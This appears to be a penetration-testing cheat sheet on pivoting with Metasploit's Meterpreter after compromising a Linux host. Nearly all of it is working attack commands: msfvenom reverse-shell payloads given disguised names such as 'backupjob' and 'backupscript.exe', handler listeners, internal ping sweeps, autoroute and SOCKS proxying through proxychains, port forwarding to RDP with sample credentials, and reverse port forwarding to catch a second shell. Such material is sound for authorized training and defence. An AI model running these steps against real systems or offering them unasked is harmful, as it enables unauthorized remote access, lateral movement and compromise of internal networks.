# Meterpreter Tunneling & Port Forwarding
**Concept:** You have compromised **Host A** (The Pivot). You want to attack **Host B** (Internal Network). Instead of uploading binary tools, you use the existing Meterpreter session to route traffic.
## 1. Establishing the Beachhead
**Context:** First, we need a stable Meterpreter session on the Pivot Host (Ubuntu).

**1. Create Payload (Attacker):**
```shell
# LHOST: Your IP (VPN) | LPORT: Your Listener Port
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=8080 -f elf -o backupjob
```

**2. Start Listener (Attacker):**
```shell
msfconsole -q
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8080
run
```

**3. Execute (Victim):**
```shell
chmod +x backupjob
./backupjob
```

**Result:** You now have a session (e.g., Session 1).
## 2. Network Discovery (Ping Sweep)
**Goal:** Identify live hosts on the internal network (e.g., `172.16.5.0/24`) visible to the compromised host.
### Method A: Meterpreter Module (Easiest)
```shell
# Uses the compromised host to scan the subnet
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/24
```
### Method B: Native Shell (Living Off The Land)
If you drop into a shell (`shell`), you can use native OS commands.

**Linux (Bash Loop):**
```shell
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
```

**Windows (CMD Loop):**
```shell
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

**Windows (PowerShell):**
```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```
## 3. The Pivot (AutoRoute & SOCKS)
**Concept:**
1. **AutoRoute:** Tells **Metasploit** modules (like `scanner/portscan`) to route traffic through Session 1.
2. **SOCKS Proxy:** Tells **External Tools** (like Nmap/Firefox) to route traffic through Metasploit, via Session 1.
### Step 1: AutoRoute (Internal Routing)
```shell
# Inside Meterpreter
meterpreter > run autoroute -s 172.16.5.0/24

# Verify routes
meterpreter > run autoroute -p
```
_Effect: You can now use `use auxiliary/scanner/smb/smb_version` against 172.16.5.19 directly._
### Step 2: SOCKS Proxy (External Routing)
To use Nmap or browser, we need a SOCKS server.
```shell
# Background the session
meterpreter > bg

# Configure SOCKS4a
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 127.0.0.1
set VERSION 4a
run
```
### Step 3: Configure Proxychains
Add the Metasploit SOCKS server to your local config. **File:** `/etc/proxychains4.conf`
```txt
[ProxyList]
socks4 127.0.0.1 9050
```
### Step 4: Validate
```shell
# Scan the internal target via the pivot
proxychains nmap -sT -Pn -p 3389 172.16.5.19
```
## 4. Port Forwarding (Direct Access)
**Scenario:** You found RDP (3389) open on the internal host (172.16.5.19). You want to connect to it using `xfreerdp`. 
**Tool:** `portfwd` (Meterpreter). This maps a port on **Host A** to a port on **Host B**, bridging them locally.
### Local Forwarding
```shell
# Syntax: portfwd add -l <LocalPort> -p <RemotePort> -r <RemoteIP>
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```
**Usage:** Now, connect to _localhost_ on port 3300. Meterpreter forwards it to the target.

```shell
xfreerdp /v:127.0.0.1:3300 /u:victor /p:pass@123
```

**Cleanup:**
```shell
meterpreter > portfwd list
meterpreter > portfwd flush
```
## 5. Reverse Port Forwarding (Catching Shells)
**Scenario:** You are attacking the internal Windows host (`172.16.5.19`). You want it to send a reverse shell _back_ to you. 
**Problem:** The internal host cannot route to your VPN IP (`10.10.14.18`). It can only see the Pivot Host (`172.16.5.129`). 
**Solution:** We open a listening port on the Pivot Host that forwards traffic back to MSF.
### Step 1: Set up the Forwarder
```shell
# Forward traffic hitting Pivot:1234 -> Attacker:8081
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```
### Step 2: Generate Payload (Targeting the Pivot)
The payload must point to the **Pivot Host's IP** (`172.16.5.129`), not yours.
```shell
# LHOST = Pivot Internal IP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 LPORT=1234 -f exe -o backupscript.exe
```
### Step 3: Start Listener (Attacker)
Listen on the local forwarded port (`8081`).
```shell
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8081
run
```

**Flow:**
1. Victim runs payload -> Connects to Pivot (`172.16.5.129:1234`).
2. Meterpreter on Pivot catches it -> Forwards to Attacker (`10.10.14.18:8081`).
3. Multi/Handler catches it -> **Session 2 Opened.**